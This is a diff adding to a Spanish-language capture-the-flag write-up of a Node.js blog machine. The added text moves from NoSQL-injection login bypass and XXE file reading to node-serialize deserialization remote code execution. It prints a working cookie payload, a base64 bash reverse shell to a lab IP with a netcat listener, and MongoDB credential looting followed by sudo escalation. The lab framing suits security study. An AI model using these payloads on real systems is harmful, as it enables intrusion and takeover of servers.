@@ -58,5 +58,127 @@ Ahora probaremos envede el formado predeterminado donde el usuario y la contrase
 ```
 {"user": "admin", "password": {"ne": "admin"}}
 ```
+Gracias a esto conseguimos el token de autentificacion, lo ponemos en el navegador y nos redirigira a la página ya logueados.
+
+Nos encontramos con un boton de "Upload" en el que podemos subir archivos y encontramos una injección XML
+
+Gracias a esto podemos redirigir y leer diferentes ficheros del sistema como /etc/passwd
+
+Anteriormente sabiamos que dentro de /opt/blog podemos leer el codigo del blog osea que vamos a ello.
+
+En la que nos revela el siguiente codigo: 
+```
+const express = require('express')
+const mongoose = require('mongoose')
+const Article = require('./models/article')
+const articleRouter = require('./routes/articles')
+const loginRouter = require('./routes/login')
+const serialize = require('node-serialize')
+const methodOverride = require('method-override')
+const fileUpload = require('express-fileupload')
+const cookieParser = require('cookie-parser');
+const crypto = require('crypto')
+const cookie_secret = "UHC-SecretCookie"
+//var session = require('express-session');
+const app = express()
+mongoose.connect('mongodb://localhost/blog')
+app.set('view engine', 'ejs')
+app.use(express.urlencoded({ extended: false }))
+app.use(methodOverride('_method'))
+app.use(fileUpload())
+app.use(express.json());
+app.use(cookieParser());
+//app.use(session({secret: "UHC-SecretKey-123"}));
+function authenticated(c) {
+if (typeof c == 'undefined')
+return false
+c = serialize.unserialize(c)
+if (c.sign == (crypto.createHash('md5').update(cookie_secret +
+c.user).digest('hex')) ){
+return true
+ } else {
+return false
+ }
+}
+app.get('/', async (req, res) => {
+const articles = await Article.find().sort({
+createdAt: 'desc'
+ })
+res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress,
+authenticated: authenticated(req.cookies.auth) })
+})
+app.use('/articles', articleRouter)
+app.use('/login', loginRouter)
+```
+Leyendo un poco por arriba nos damos cuenta que con la funcion authenticated y pasandole la cookie de usuario que anteriormente hemos conseguido, podriamos llegar a hacer algo.
+
+Gracias a esto conseguimos la cookie 
+```
+{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
+```
+Aqui tenemos la primera fase del proceso que sería probar a hacer un ping con un URL encode desde la BurpSuite 
+
+Con este payload 
+```
+Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","haxez":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"ping -c 4 10.10.14.126\", function(error, stdout, stderr) { console.log(stdout) });}()"}
+```
+Para que entendamos esto, es un payload sacado, con la simple funcion que hace un ping a nuestro ordenador para entender si nos hay una conexión y estan llegando los paquetes y tenemos la posibilidad de inyectar comandos en el servidor.
+
+Desde nuestra máquina hariamos el comando para recibir comandos.
+
+```
+sudo tcpdump -ni tun0 icmp
+```
+Si esto ha salido existoso podemos pasar a hacer una reverse shell bastante simple.
+
+```
+echo -n 'bash -i  >& /dev/tcp/10.10.14.126/9001 0>&1' | base64
+```
+y cambiamos la funcion de nuestro ping por esta añadiendo.
+```
+echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI2LzkwMDEgMD4mMQ== | base64 -d | bash
+```
+Desde el Get, posteriormente hacemos una escucha esde el puerto elegido en mi caso 9001
+```
+sudo nc -lvnp 9001
+```
+Y buala estamos dentro!
+
+## PRIVILEGE ESCALATION
+
+Para empezar vamos a enumerar el sistema con ps
+```
+ps auxww
+```
+Nos encontramos con un MongoDB al cual tenemos acceso. Puerto 27017
+
+```
+ss -tlpn 
+```
+Gracias a esto podemos ver que nos podemos conectar manualmente a dicha base de datos
+
+```
+mongo
+```
+Dentro
+```
+show dbs
+use blog
+show colletions
+```
+Nos encontramos con la coleccion usuarios y la leemos
+```
+db.users.find()
+```
+Aqui dentro nos encontramos la contraseña del administrador
+(Cual no voy a decir)
+hacemos un 
+```
+sudo -l
+sudo su
+```
+Y ya ESTA!!!!
+
+
 
 
